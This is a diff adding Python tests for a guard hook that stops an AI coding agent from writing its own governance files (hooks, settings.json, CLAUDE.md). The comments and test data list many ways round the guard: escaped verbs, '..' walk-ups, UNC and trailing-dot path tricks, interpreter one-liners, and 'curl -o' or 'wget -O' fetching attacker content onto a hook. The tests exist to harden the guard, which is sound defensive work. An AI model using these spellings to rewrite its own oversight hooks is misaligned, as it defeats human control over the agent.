@@ -1024,6 +1024,487 @@ def test_block_message_covers_the_governance_cli_invocation_case():
           "err=%r" % err)
 
 
+# ------------------------------------------------------------ shlex token layer
+# STRUCTURAL HARDENING (2026-08-28). A prior root-cause audit of this guard's git
+# history (823375a -> 569ef4b -> 6281076 -> 7d01eff -> e39ce4c -> 8a4d51d ->
+# 1939bac -> 8ec80a2/9adcc5b) found a repeated "bypass found -> patch -> new
+# bypass found" cycle, each patch closing ONE lexical spelling (mode-blind
+# open(), .claude-substring-inside-.claude-worktrees, heredoc bodies,
+# quote/caret splitting) while the raw-text matcher stayed structurally blind to
+# the next spelling. The fix is a shlex-based token layer: parse the command the
+# way a real shell does, then classify the RECONSTRUCTED argv tokens through the
+# same _norm/_classify realpath resolution trusted for structured file tools.
+# The layer is UNION-ONLY on top of the lexical net (it can add a detection,
+# never remove one), so every previously-blocked command stays blocked by
+# construction.
+def test_shlex_token_layer_bypasses_closed():
+    """Escape/quote spellings that defeat pure raw-text matching but that a real
+    shell resolves onto a governance path. Each reached exit 0 against the
+    pre-token-layer guard (RED run recorded before implementation)."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    must_block = [
+        # (1) bash backslash-escape inside the PATH: `hoo\ks` executes as
+        # `hooks`, but the guard's backslash->slash normalization turned it into
+        # the unrelated path segment pair `hoo/ks`.
+        ("echo x > %s/hoo\\ks/evil.py" % root,
+         "backslash-escape mid-path (hooks)"),
+        ("cp evil.json %s/set\\tings.json" % root,
+         "backslash-escape mid-path (settings.json)"),
+        ("echo x > %s/CLAUDE.m\\d" % root,
+         "backslash-escape mid-path (CLAUDE.md)"),
+        ("echo x > ~/.claude/hoo\\ks/evil.py" % (),
+         "backslash-escape in a tilde-form governance path"),
+        # (2) bash backslash-escape inside the WRITE VERB: `c\p` executes as
+        # `cp`, but no lexical write indicator ever matched, so the guard never
+        # even scanned the command for governance paths.
+        ("c\\p evil.json %s/hooks/evil.py" % root,
+         "backslash-escaped write verb cp"),
+        ("m\\v evil.json %s/settings.json" % root,
+         "backslash-escaped write verb mv"),
+        # (3) real file-writing commands with no lexical indicator at all --
+        # closable only by reasoning about the command word of the parsed
+        # token stream.
+        ("install -m 644 evil.py %s/hooks/g.py" % root,
+         "install(1) onto a hook"),
+        ("ln -sf /tmp/evil %s/hooks/confidentiality-guard.py" % root,
+         "ln -sf over a hook"),
+        ("truncate -s 0 %s/settings.json" % root,
+         "truncate of settings.json"),
+        # (4) combined quote-split + backslash-escape -- each half was closed
+        # separately before; the token layer resolves both at once because
+        # shlex applies the same rules the shell does.
+        ('echo x > "%s"/hoo\\ks/evil.py' % root,
+         "quote-split root + escaped hooks segment"),
+    ]
+    for cmd, label in must_block:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("token layer closes: %s" % label, rc == 2,
+              "rc=%s cmd=%r err=%r" % (rc, cmd, err))
+
+
+def test_shlex_token_layer_no_overblock():
+    """The token layer must not turn benign commands into blocks -- the same
+    direction-of-error discipline as the 2026-08-05 union-only variant scan."""
+    r = Rig()
+    benign = [
+        # the same spellings aimed at NON-governance paths
+        ("echo x > /tmp/hoo\\ks/evil.py", "escaped path outside governance"),
+        ("install -m 644 x.py /usr/local/bin/tool", "install elsewhere"),
+        ("ln -s a.txt b.txt", "relative ln"),
+        ("truncate -s 0 /tmp/big.log", "truncate elsewhere"),
+        # write-command NAMES as arguments, not commands
+        ("echo cp mv rm install > /tmp/verbs.txt", "verbs as echo args"),
+        ("man ln && cat \"%s\"" % r.path("hooks", "g.py"),
+         "man page + governance READ"),
+        ("grep -rn install \"%s\" 2>/dev/null" % r.path("hooks"),
+         "grep for 'install' inside hooks (read)"),
+        # .claude-worktrees boundary must hold in the token layer too
+        ("echo x > .claude-worktrees/foo/hooks/g.py",
+         "relative .claude-worktrees is not .claude"),
+        ("truncate -s 0 C:/Users/Owner/oxford-command-center/.claude/"
+         "workflows/foo.json",
+         "token write-verb + unrelated repo's own .claude/workflows"),
+    ]
+    for cmd, label in benign:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("token layer no over-block: %s" % label, rc == 0,
+              "rc=%s cmd=%r err=%r" % (rc, cmd, err))
+
+
+def test_dotdot_through_exempt_prefix_still_blocks():
+    """Adversarial pass 2026-08-28, class 1. A path that STARTS with an exempt
+    segment (hooks/sessions, hooks/state, hooks/active-work, worktrees) and then
+    walks back UP with `..` into governance was allowed: the exempt marker
+    matched textually and short-circuited before the `..` was resolved. The
+    drive-qualified form was already blocked (realpath); the tilde and relative
+    forms leaked. Each of these, run by the real shell, writes the live
+    governance file named after the `..` collapses."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    must_block = [
+        # tilde forms -- always reach the LIVE root regardless of the seam
+        "echo x > ~/.claude/hooks/sessions/../evil.py",
+        "echo x > ~/.claude/hooks/state/../evil.py",
+        "echo x > ~/.claude/hooks/active-work/../evil.py",
+        "echo x > ~/.claude/worktrees/../hooks/evil.py",
+        "echo x > ~/.claude/hooks/sessions/../../settings.json",
+        "cp /tmp/x ~/.claude/hooks/sessions/../evil.py",
+        # drive-qualified form under the seam root (was already blocked; pin it)
+        "echo x > %s/hooks/sessions/../evil.py" % root,
+        "echo x > %s/hooks/state/../../settings.json" % root,
+        "echo x > %s/worktrees/../hooks/evil.py" % root,
+    ]
+    for cmd in must_block:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("dotdot-through-exempt blocked: %r" % cmd, rc == 2,
+              "rc=%s err=%r" % (rc, err))
+    # the exempt dirs themselves, with NO walk-up, must still be exempt
+    for cmd in [
+        "echo x > ~/.claude/hooks/sessions/foo/bar.json",
+        "echo x > ~/.claude/hooks/state/roster.json",
+        "echo x > %s/hooks/active-work/claim.json" % root,
+    ]:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("genuine exempt path still allowed: %r" % cmd, rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_unrecognized_file_writers_still_block():
+    """Adversarial pass 2026-08-28, class 2. File-writing commands the lexical
+    indicator set never covered -- they name the governance target directly
+    (no shell trick) but no write verb/redirect was present, so classify_shell
+    short-circuited to allow. Each writes the named governance file when run."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    hooks = root + "/hooks/evil.py"
+    settings = root + "/settings.json"
+    must_block = [
+        "curl -o %s http://attacker/x" % hooks,     # remote content onto a hook
+        "curl -O --output-dir %s http://a/x.py" % (root + "/hooks"),
+        "wget -O %s http://a/x" % hooks,
+        "tar -xf a.tar -C %s" % (root + "/hooks"),  # extract over hook files
+        "unzip -d %s a.zip" % (root + "/hooks"),
+        "sort in -o %s" % hooks,                    # -o output
+        "patch %s < p.diff" % hooks,                # in-place modify
+        "install -m 644 evil.py %s" % hooks,
+        "truncate -s 0 %s" % settings,
+        "gpg -o %s -d a.gpg" % hooks,
+        "openssl enc -out %s -in a" % hooks,
+    ]
+    for cmd in must_block:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("unrecognized writer blocked: %r" % cmd, rc == 2,
+              "rc=%s err=%r" % (rc, err))
+    # the SAME commands as reads / aimed elsewhere must NOT block -- the output
+    # flag is what makes them writes, so a read form stays allowed.
+    must_allow = [
+        "curl http://host/x",                       # read to stdout, no -o
+        "curl https://host/.claude/hooks/x",        # url mentions marker, still read
+        "tar -tf %s/hooks/a.tar" % root,            # list (read) an archive in hooks
+        "sort %s/hooks/g.py" % root,                # sort to stdout (read)
+        "curl -o /tmp/ok.py http://host/x",         # writes elsewhere
+        "unzip -l a.zip",                           # list only
+    ]
+    for cmd in must_allow:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("read/elsewhere form allowed: %r" % cmd, rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_interpreter_inline_code_writers_still_block():
+    """Adversarial pass 2026-08-28, round 2. An interpreter one-liner or a raw
+    REPL input naming a governance path is WRITE-UNDECIDABLE -- its body cannot
+    be statically classified as read-only -- so it must read as write-shaped and
+    let the (correct) path classifier run. Each of these was ALLOWED before the
+    fix: no lexical write verb and no redirect, so classify_shell short-circuited
+    to allow before ever classifying the governance path it names. The guard's
+    OWN block text already claims `python -c` naming a governance path 'reads as
+    write-shaped'; this makes that claim true across interpreters."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    hooks = root + "/hooks/evil.py"
+    settings = root + "/settings.json"
+    claudemd = root + "/CLAUDE.md"
+    DC = "mcp__Desktop_Commander__"
+    must_block = [
+        # PowerShell .NET static writers -- always present on Windows
+        ("Bash", {"command":
+            'powershell -c "[IO.File]::WriteAllText(\'%s\',\'x\')"' % hooks}),
+        ("Bash", {"command":
+            'powershell -c "[System.IO.File]::WriteAllText(\'%s\',\'x\')"' % settings}),
+        ("Bash", {"command":
+            'powershell -Command "[IO.File]::Copy(\'a.txt\',\'%s\')"' % claudemd}),
+        # Python chained-open (mode not in the slot _open_may_write inspects)
+        ("Bash", {"command":
+            'python -c "from pathlib import Path; '
+            'Path(r\'%s\').open(\'w\').write(\'x\')"' % hooks}),
+        ("Bash", {"command":
+            'python3 -c "__import__(\'pathlib\').Path(r\'%s\')'
+            '.open(mode=\'w\').write(\'x\')"' % settings}),
+        # Node stream writer (createWriteStream is not a listed indicator)
+        ("Bash", {"command":
+            'node -e "require(\'fs\').createWriteStream(\'%s\').end(\'x\')"' % hooks}),
+        # gawk in-place edit
+        ("Bash", {"command": "gawk -i inplace '{print \"x\"}' %s" % hooks}),
+        # the same undecidable write via the interact_with_process REPL input
+        (DC + "interact_with_process",
+         {"pid": 1, "input": "from pathlib import Path; "
+                             "Path(r'%s').open('w').write('x')" % hooks}),
+    ]
+    for tool, ti in must_block:
+        rc, _, err = r.run(payload(tool, ti))
+        detail = ti.get("command", ti.get("input", ""))
+        check("interpreter/REPL writer blocked: %r" % detail[:70], rc == 2,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_interpreter_inline_code_no_overblock():
+    """An interpreter one-liner that names NO governance path (or only an
+    unrelated one) stays allowed -- the undecidability rule only fires the path
+    classifier, it never blocks on interpreter-ness alone."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    DC = "mcp__Desktop_Commander__"
+    allowed = [
+        ("Bash", {"command": 'python -c "print(1+1)"'}),
+        ("Bash", {"command": 'python3 -c "open(\'/tmp/x\',\'w\').write(\'x\')"'}),
+        ("Bash", {"command": 'node -e "console.log(process.version)"'}),
+        ("Bash", {"command": "gawk -i inplace '{print}' /tmp/notes.txt"}),
+        # interpreter running a SCRIPT FILE located in hooks (read/exec, not
+        # inline code) must still be allowed -- running hook tests is routine.
+        ("Bash", {"command": 'python "%s"' % r.path("hooks", "tests", "t.py")}),
+        # REPL input naming no governance path
+        (DC + "interact_with_process",
+         {"pid": 1, "input": "print(open('/tmp/data.json').read())"}),
+    ]
+    for tool, ti in allowed:
+        rc, _, err = r.run(payload(tool, ti))
+        detail = ti.get("command", ti.get("input", ""))
+        check("interpreter no over-block: %r" % detail[:60], rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_tilde_relative_trailing_dot_single_file_targets_block():
+    """Adversarial pass 2026-08-28, round 3. Win32 strips a trailing dot from a
+    path's final component, so `~/.claude/CLAUDE.md.` overwrites the live
+    CLAUDE.md when run by cmd.exe/PowerShell (`~` expands, dot stripped). `_norm`
+    strips the dot for drive-qualified and structured targets, but the
+    tilde/relative marker path matched raw text where a trailing `.` glued onto
+    the exact-file marker and defeated the boundary check. The generic markers
+    are always-armed, so these block regardless of the test seam."""
+    r = Rig()
+    DC = "mcp__Desktop_Commander__"
+    must_block = [
+        ("Bash", {"command":
+            "powershell -NoProfile -Command \"Set-Content -Path "
+            "'~/.claude/CLAUDE.md.' -Value x\""}),
+        (DC + "start_process", {"command":
+            "powershell -NoProfile -Command \"Set-Content -Path "
+            "'~/.claude/settings.json.' -Value x\""}),
+        ("Bash", {"command":
+            "powershell -Command \"Set-Content '~/.claude/settings.local.json.' x\""}),
+        # plain redirect forms (real under cmd.exe; fail-toward-block regardless
+        # of which shell actually runs them)
+        ("Bash", {"command": "cmd /c echo x> ~/.claude/CLAUDE.md."}),
+        ("Bash", {"command": "cmd /c echo x> .claude/CLAUDE.md."}),
+        ("Bash", {"command": "cmd /c echo x> ~/.claude/CLAUDE.md.. "}),
+    ]
+    for tool, ti in must_block:
+        rc, _, err = r.run(payload(tool, ti))
+        check("tilde/relative trailing-dot single-file blocked: %r"
+              % ti.get("command", "")[:60], rc == 2, "rc=%s err=%r" % (rc, err))
+    # a genuinely different sibling name must NOT be swept in
+    for cmd in [
+        "cmd /c echo x> ~/.claude/CLAUDE.md.backup",   # distinct file
+        "cmd /c echo x> ~/.claude/settings.json.bak",  # distinct file
+    ]:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("distinct sibling name not swept: %r" % cmd, rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_perl_ruby_editor_inplace_writers_block():
+    """Adversarial pass 2026-08-28, round 3. perl/ruby in-place edit (`-i`) and
+    the idiomatic combined `-pe`/`-ne` bundles rewrite the named file with no
+    write verb in the text; only awk's `-i inplace` was handled. Scripted
+    editors (ex/ed/vim -es) are the same in-place-editor class."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    hooks = root + "/hooks/evil.py"
+    settings = root + "/settings.json"
+    must_block = [
+        "perl -i -pe 's/OLD/NEW/' %s" % hooks,
+        "perl -i.bak -pe '1' %s" % settings,
+        "perl -ne 'print' %s" % hooks,           # -e inline body naming gov path
+        "ruby -i -pe 'gsub(/a/, \"b\")' %s" % hooks,
+        "perl -pi -e 's/a/b/' %s" % settings,
+        "ex -s -c wq %s" % settings,             # scripted ex write
+        "vim -es -c 'wq' %s" % hooks,
+    ]
+    for cmd in must_block:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("perl/ruby/editor in-place writer blocked: %r" % cmd[:50], rc == 2,
+              "rc=%s err=%r" % (rc, err))
+    # perl/ruby aimed elsewhere, or with no in-place/inline flag, stay allowed
+    must_allow = [
+        "perl -i -pe 's/a/b/' /tmp/notes.txt",
+        "perl -w -l /tmp/script.pl",             # no i/e -- not undecidable-write
+        "ruby /tmp/app.rb",
+    ]
+    for cmd in must_allow:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("perl/ruby elsewhere allowed: %r" % cmd, rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_unrecognized_external_writers_fail_toward_block():
+    """Adversarial pass 2026-08-28, round 6 -- the durable close of the
+    write-DETECTION deny-list tail (the audit's allow-list-inversion). A command
+    the guard does not recognize as a known reader, writer, or interpreter, that
+    names a governance path as a bare argv operand, is treated as write-shaped
+    (fail toward block) -- so a NEW file-writer (certutil -decode, xxd -r,
+    esentutl, sed 'w', or any future tool) is caught by default instead of
+    silently allowed. Blocks only fire when a governance path is actually
+    present, so the blast radius is confined to unknown-commands-touching-
+    governance."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    hooks = root + "/hooks/confidentiality-guard.py"
+    must_block = [
+        "certutil -f -decode payload.b64 %s" % hooks,
+        "xxd -r -p payload.hex %s" % hooks,
+        "sed -n 'w %s' src.txt" % hooks,
+        "esentutl /y src.db /d %s" % hooks,       # unknown -> fail toward block
+        "certutil -decode in.b64 %s/settings.json" % root,
+        "someunknownwriter --out %s/CLAUDE.md in" % root,
+    ]
+    for cmd in must_block:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("unrecognized-writer fail-toward-block: %r" % cmd[:50], rc == 2,
+              "rc=%s err=%r" % (rc, err))
+    # an unknown command that names NO governance path is still ALLOWED -- the
+    # inversion only bites when a governance path is present.
+    for cmd in [
+        "certutil -decode in.b64 /tmp/out.bin",
+        "someunknowntool --out /tmp/x.txt in",
+        "xxd -r -p a.hex /tmp/b.bin",
+    ]:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("unknown command, no governance path -> allow: %r" % cmd[:40],
+              rc == 0, "rc=%s err=%r" % (rc, err))
+
+
+def test_known_readers_of_governance_paths_still_allowed():
+    """The inversion must NOT block routine READS that name a governance path --
+    that would make people route around the guard (ratified concern). The
+    common read/inspect tools stay reads."""
+    r = Rig()
+    hooks = r.path("hooks", "confidentiality-guard.py")
+    hooksdir = r.path("hooks")
+    reads = [
+        'cat "%s"' % hooks,
+        'head -20 "%s"' % hooks,
+        'tail -5 "%s"' % hooks,
+        'wc -l "%s"' % hooks,
+        'grep -n x "%s"' % hooks,
+        'less "%s"' % hooks,
+        'diff "%s" "%s"' % (hooks, hooks),
+        'stat "%s"' % hooks,
+        'file "%s"' % hooks,
+        'ls -la "%s"' % hooksdir,
+        'find "%s" -name "*.py"' % hooksdir,
+        'md5sum "%s"' % hooks,
+        'sha256sum "%s"' % hooks,
+        'git -C ~/.claude log --oneline -- hooks/',
+        'sed -n "1,5p" "%s"' % hooks,             # read-only sed (no -i, no w)
+        'awk "{print}" "%s"' % hooks,             # read-only awk (no -i)
+        'python "%s"' % r.path("hooks", "tests", "t.py"),  # run a script (read)
+        'pytest "%s"' % r.path("hooks", "tests"),          # run tests (read)
+    ]
+    for cmd in reads:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("known reader of governance path allowed: %r" % cmd[:45], rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_interior_component_trailing_dot_block():
+    """Adversarial pass 2026-08-28, round 5. An interior trailing dot on the
+    `.claude` component of a tilde/relative path (`~/.claude./hooks/evil.py`).
+    PowerShell expands `~` and Win32 strips the interior dot, landing the write
+    in the real `.claude/hooks`. Round 3 skipped a dot only at the END of a
+    marker match (the leaf); an interior dot between `.claude` and `/hooks`
+    broke the marker's contiguity. Fix strips trailing dots/spaces from EACH
+    interior component before matching. Always-armed markers -> seam-independent."""
+    r = Rig()
+    root = r.path().rstrip("/\\")
+    must_block = [
+        ("Bash", {"command":
+            'powershell -c "Set-Content ~/.claude./hooks/evil.py PWNED"'}),
+        ("Bash", {"command":
+            'powershell -c "Set-Content ~/.claude./settings.json PWNED"'}),
+        ("mcp__Desktop_Commander__start_process", {"command":
+            'powershell -c "Set-Content ~/.claude./CLAUDE.md PWNED"'}),
+        # bare token forms (own shlex token) via cp/redirect
+        ("Bash", {"command": "cp evil.py ~/.claude./hooks/evil.py"}),
+        ("Bash", {"command": "cmd /c echo x > .claude.\\hooks\\evil.py"}),
+        # multiple interior dots / dot+space
+        ("Bash", {"command":
+            'powershell -c "Set-Content ~/.claude.../hooks/evil.py x"'}),
+        # interior dot on a DEEPER component too
+        ("Bash", {"command":
+            'powershell -c "Set-Content ~/.claude/hooks./evil.py x"'}),
+    ]
+    for tool, ti in must_block:
+        rc, _, err = r.run(payload(tool, ti))
+        check("interior-dot governance write blocked: %r"
+              % ti["command"][:55], rc == 2, "rc=%s err=%r" % (rc, err))
+    # bare relative `./` and `../` must not be mangled into false matches, and a
+    # genuinely distinct sibling component must not be swept in
+    must_allow = [
+        "echo x > ./hooks/log.txt",              # cwd-relative, not governance
+        "echo x > ../sibling/hooks/x.txt",       # parent walk, not .claude
+        "cat ./notes.md",                        # read
+        "echo x > ~/.claudeX/hooks/y.py",        # distinct root name
+    ]
+    for cmd in must_allow:
+        rc, _, err = r.run(payload("Bash", {"command": cmd}))
+        check("interior-dot no over-block: %r" % cmd, rc == 0,
+              "rc=%s err=%r" % (rc, err))
+
+
+def test_unc_admin_share_and_device_paths_block():
+    """Adversarial pass 2026-08-28, round 4. A UNC admin-share path
+    (`\\\\localhost\\C$\\...`) spells the drive as `C$`, not `C:`, so neither
+    realpath detector (both require a literal drive-colon) fires, and the
+    generic textual markers were the only backstop -- which an interior trailing
+    dot on the `.claude` component or its 8.3 alias then broke. Fix: rewrite the
+    share/device prefix to a drive-qualified form BEFORE classifying, so the
+    write routes back through realpath. Tested against the SEAM ROOT's own UNC
+    form (the mechanism), since the interior-dot/8.3 collapse rides on realpath
+    of an existing dir, which only holds against the real live root."""
+    r = Rig()
+    win = r.root  # native backslash form, e.g. C:\Users\...\cwg-root-X
+    drive, tail = win[0], win[2:]  # 'C', '\\Users\\...\\cwg-root-X'
+    hooks_tail = tail + "\\hooks\\evil.py"
+    settings_tail = tail + "\\settings.json"
+    must_block = [
+        ("Bash", {"command": 'cmd /c echo x > "\\\\localhost\\%s$%s"'
+                             % (drive, hooks_tail)}),
+        ("mcp__Desktop_Commander__start_process",
+         {"command": 'cmd /c echo x > "\\\\127.0.0.1\\%s$%s"'
+                     % (drive, settings_tail)}),
+        ("Bash", {"command": 'cmd /c echo x > "\\\\?\\UNC\\localhost\\%s$%s"'
+                             % (drive, hooks_tail)}),
+        # device path with a literal drive-colon (already caught; pin it)
+        ("Bash", {"command": 'cmd /c echo x > "\\\\?\\%s:%s"'
+                             % (drive, hooks_tail)}),
+        # forward-slash admin-share spelling
+        ("Bash", {"command": 'echo x > //localhost/%s$%s'
+                             % (drive, hooks_tail.replace("\\", "/"))}),
+    ]
+    for tool, ti in must_block:
+        rc, _, err = r.run(payload(tool, ti))
+        check("UNC/device governance write blocked: %r"
+              % ti["command"][:55], rc == 2, "rc=%s err=%r" % (rc, err))
+    # a UNC path to an UNRELATED location must still be allowed
+    rc, _, err = r.run(payload("Bash", {
+        "command": 'cmd /c echo x > "\\\\localhost\\%s$\\Users\\Owner\\other\\x.py"'
+                   % drive}))
+    check("UNC to an unrelated path -> allow", rc == 0, "rc=%s err=%r" % (rc, err))
+
+
+def test_shlex_token_layer_unparseable_still_blocked_lexically():
+    """An unbalanced quote makes shlex raise -- the token layer must degrade to
+    the lexical net, not to allow. Pinned so a refactor can never make shlex
+    parseability a precondition for blocking."""
+    r = Rig()
+    cmd = 'echo x > %s "' % r.path("hooks", "evil.py")
+    rc, _, err = r.run(payload("Bash", {"command": cmd}))
+    check("unbalanced quote still blocks via the lexical net", rc == 2,
+          "rc=%s err=%r" % (rc, err))
+
+
 def test_governance_cli_guidance_is_advice_only_not_an_exemption():
     # The guidance must not have quietly become a matcher carve-out: the same
     # commands still BLOCK (asserted above), and a real write dressed up as a
@@ -1076,6 +1557,19 @@ if __name__ == "__main__":
     test_fail_open_on_garbage_input()
     test_exit_code_is_never_one()
     test_block_message_covers_the_governance_cli_invocation_case()
+    test_shlex_token_layer_bypasses_closed()
+    test_shlex_token_layer_no_overblock()
+    test_dotdot_through_exempt_prefix_still_blocks()
+    test_unrecognized_file_writers_still_block()
+    test_interpreter_inline_code_writers_still_block()
+    test_interpreter_inline_code_no_overblock()
+    test_tilde_relative_trailing_dot_single_file_targets_block()
+    test_perl_ruby_editor_inplace_writers_block()
+    test_unrecognized_external_writers_fail_toward_block()
+    test_known_readers_of_governance_paths_still_allowed()
+    test_interior_component_trailing_dot_block()
+    test_unc_admin_share_and_device_paths_block()
+    test_shlex_token_layer_unparseable_still_blocked_lexically()
     test_governance_cli_guidance_is_advice_only_not_an_exemption()
     test_blocks_destructive_recursive_deletes()
     test_delete_bypasses_found_by_independent_review()
